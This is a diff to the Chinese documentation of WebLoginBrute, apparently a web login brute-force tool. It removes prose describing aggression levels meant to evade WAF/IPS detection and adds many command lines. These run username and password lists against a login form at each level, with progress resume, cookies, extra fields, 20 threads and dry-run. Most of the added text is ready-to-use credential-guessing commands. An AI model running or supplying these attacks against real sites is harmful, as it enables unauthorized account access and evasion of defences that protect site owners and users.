@@ -30,33 +30,118 @@
 
 你可以使用 `--progress-file` 参数指定自定义的进度文件路径。
 
-## 对抗级别 (Aggression Levels)
+## 对抗级别
 
-为了模拟不同的攻击者行为并规避WAF/IPS的检测，WebLoginBrute内置了四个预设的对抗级别。
+WebLoginBrute提供了4个对抗级别，用于适应不同的安全环境：
 
--   **`A0` (静默)**: 最高速模式，几乎没有延迟。适合在没有防护的测试环境中快速验证。
--   **`A1` (标准)**: **默认级别**。引入了较短的随机延迟，能规避一些基础的频率限制。
--   **`A2` (激进)**: 更长的延迟和更大的随机性（抖动）。旨在模拟更耐心的攻击者行为。
--   **`A3` (极限)**: 非常长的延迟。用于对抗具有严格访问控制和行为分析能力的高安全目标。
+### A0 - 静默模式
+```bash
+python -m webloginbrute \
+  --form https://example.com/login \
+  --submit https://example.com/login \
+  --users users.txt \
+  --passwords passwords.txt \
+  --level A0
+```
 
-### 如何设置
+### A1 - 标准模式（默认）
+```bash
+python -m webloginbrute \
+  --form https://example.com/login \
+  --submit https://example.com/login \
+  --users users.txt \
+  --passwords passwords.txt \
+  --level A1
+```
 
--   **通过命令行**: `--aggression-level A2`
--   **通过YAML文件**: `aggression_level: "A2"`
+### A2 - 激进模式
+```bash
+python -m webloginbrute \
+  --form https://example.com/login \
+  --submit https://example.com/login \
+  --users users.txt \
+  --passwords passwords.txt \
+  --level A2
+```
 
-## 测试模式 (`--dry-run`)
+### A3 - 极限模式
+```bash
+python -m webloginbrute \
+  --form https://example.com/login \
+  --submit https://example.com/login \
+  --users users.txt \
+  --passwords passwords.txt \
+  --level A3
+```
 
-在正式发起攻击前，验证所有配置是否正确、字典文件是否可读、目标URL是否可达是非常重要的。测试模式（Dry Run）可以帮助你完成这些检查，而不会发送任何实际的登录尝试请求。
+## 进度恢复
 
-### 如何使用
+### 启用进度恢复
+```bash
+python -m webloginbrute \
+  --form https://example.com/login \
+  --submit https://example.com/login \
+  --users users.txt \
+  --passwords passwords.txt \
+  --resume \
+  --progress my_progress.json
+```
 
--   **通过命令行**: 添加 `--dry-run` 标志。
-    ```bash
-    python -m webloginbrute --config-file my_task.yaml --dry-run
-    ```
--   **通过YAML文件**: 设置 `dry_run: true`。
+### 自定义进度文件
+```bash
+python -m webloginbrute \
+  --form https://example.com/login \
+  --submit https://example.com/login \
+  --users users.txt \
+  --passwords passwords.txt \
+  --resume \
+  --progress /path/to/custom_progress.json
+```
 
-程序会执行包括加载配置、读取字典、获取初始登录页面（及CSRF Token）在内的所有准备步骤，然后打印一条消息表明测试成功，最后退出。
+## 高级配置
+
+### 使用Cookie文件
+```bash
+python -m webloginbrute \
+  --form https://example.com/login \
+  --submit https://example.com/login \
+  --users users.txt \
+  --passwords passwords.txt \
+  --cookies cookies.txt
+```
+
+### 额外登录字段
+```bash
+python -m webloginbrute \
+  --form https://example.com/login \
+  --submit https://example.com/login \
+  --users users.txt \
+  --passwords passwords.txt \
+  --field remember \
+  --value 1
+```
+
+### 高并发配置
+```bash
+python -m webloginbrute \
+  --form https://example.com/login \
+  --submit https://example.com/login \
+  --users users.txt \
+  --passwords passwords.txt \
+  --threads 20 \
+  --timeout 10
+```
+
+### 测试模式
+```bash
+python -m webloginbrute \
+  --form https://example.com/login \
+  --submit https://example.com/login \
+  --users users.txt \
+  --passwords passwords.txt \
+  --dry-run \
+  --verbose
+```
 
 ## 详细日志 (`--verbose`)
 
